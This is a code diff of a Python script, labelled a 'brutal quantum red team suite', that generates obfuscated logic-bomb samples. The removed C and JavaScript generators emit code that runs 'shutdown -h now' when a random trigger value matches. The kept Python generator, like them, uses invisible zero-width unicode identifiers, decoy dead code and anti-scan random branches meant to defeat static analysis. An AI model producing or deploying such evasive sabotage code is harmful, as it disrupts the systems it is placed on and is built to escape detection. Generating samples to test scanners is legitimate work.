@@ -2,13 +2,13 @@ import random
 import string
 
 def rand_ident(prefix="v"):
-    # Random identifier with unicode obfuscation
+    # Random identifier with invisible unicode obfuscation
     base = ''.join(random.choices(string.ascii_letters, k=random.randint(4,8)))
-    weird = random.choice(['', '\u200b', '\u200c', '\u200d', '_'])
-    return prefix + weird + base
+    invisible_char = random.choice(['', '\u200b', '\u200c', '\u200d', '_'])
+    return prefix + invisible_char + base
 
-def py_cross_func_bomb():
-    # Multi-function, probabilistic, chained, anti-analysis
+def py_brutal_quantum_bomb():
+    # Multi-function, probabilistic, chained, anti-analysis quantum bomb in Python
     a = rand_ident("seed_")
     b = rand_ident("fuse_")
     c = rand_ident("det_")
@@ -17,13 +17,13 @@ def py_cross_func_bomb():
 import random, os
 
 def {a}(x):
-    # Anti-scan: fake check
+    # Anti-scan: fake random check with quantum-like behavior
     if random.random() > 0.5:
         return x ^ 0x{random.randint(0x100000, 0xFFFFFF):X}
     return x
 
 def {b}(y):
-    # Decoy logic — hard to scan, dead code
+    # Decoy logic — misleading dead code
     z = y // 3
     if y > 12345:
         return y * 2
@@ -46,65 +46,14 @@ def {d}(w):
 """
     return payload
 
-def c_quantum_bomb():
-    # C-language entangled/obfuscated bomb (output as string)
-    trigger_val = random.randint(100, 1000000)
-    return f"""
-#include <stdio.h>
-#include <stdlib.h>
-#include <time.h>
-
-// Invisible unicode: {chr(8206)}
-int quantum_seed(int x) {{
-    if ((rand() % 17) == 7) return x ^ 0x{random.randint(1000,9999):X};
-    return x;
-}}
-
-void trigger(int z) {{
-    int k = quantum_seed(z);
-    if (k == {trigger_val}) {{
-        system("shutdown -h now"); // Quantum logic bomb triggered
-    }}
-}}
-// Real attacker would split this across multiple files!
-"""
-
-def js_quantum_chain_bomb():
-    # JS: quantum-styled, chained logic, noise/anti-debug
-    val = random.randint(12345, 99999)
-    return f"""
-function quantumSeed(x) {{
-    // Quantum-like branch, anti-debug
-    if (Math.random() < 0.12) {{
-        return x ^ 0x{random.randint(10000,99999):X};
-    }}
-    return x;
-}}
-function decoy(y) {{
-    // Dead logic: confuse static analyzers
-    if (y > 9876) return y * 42;
-    return y / 3;
-}}
-function trigger(z) {{
-    let k = quantumSeed(z);
-    if (k === {val}) {{
-        require('child_process').exec('shutdown -h now');
-        console.log("Quantum logic bomb detonated");
-    }}
-}}
-// Multiple split logic paths!
-"""
-
-def generate_brutal_redteam_suite(n=3):
+def generate_python_redteam_suite(n=3):
     suite = []
-    gens = [py_cross_func_bomb, c_quantum_bomb, js_quantum_chain_bomb]
     for _ in range(n):
-        func = random.choice(gens)
-        suite.append(func())
+        suite.append(py_brutal_quantum_bomb())
     return suite
 
 if __name__ == "__main__":
-    print("=== BRUTAL QUANTUM RED TEAM SUITE ===\n")
-    for s in generate_brutal_redteam_suite(6):
+    print("=== PYTHON BRUTAL QUANTUM RED TEAM SUITE ===\n")
+    for s in generate_python_redteam_suite(5):
         print(s)
         print("------\n")
